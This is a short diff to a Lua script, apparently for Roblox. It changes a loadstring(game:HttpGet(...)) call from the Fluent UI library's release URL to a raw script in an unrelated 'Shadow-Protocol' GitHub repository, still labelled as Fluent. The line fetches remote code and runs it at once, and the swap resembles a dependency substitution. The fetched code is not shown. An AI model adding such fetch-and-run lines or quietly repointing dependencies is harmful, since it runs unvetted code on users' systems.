@@ -79,7 +79,7 @@ task.spawn(function()
 
     local function LoadMainScript()
         local success, Fluent = pcall(function()
-            return loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/davidcespedes726-tech/Shadow-Protocol/refs/heads/main/script.lua"))()
         end)
         
         if success and Fluent then
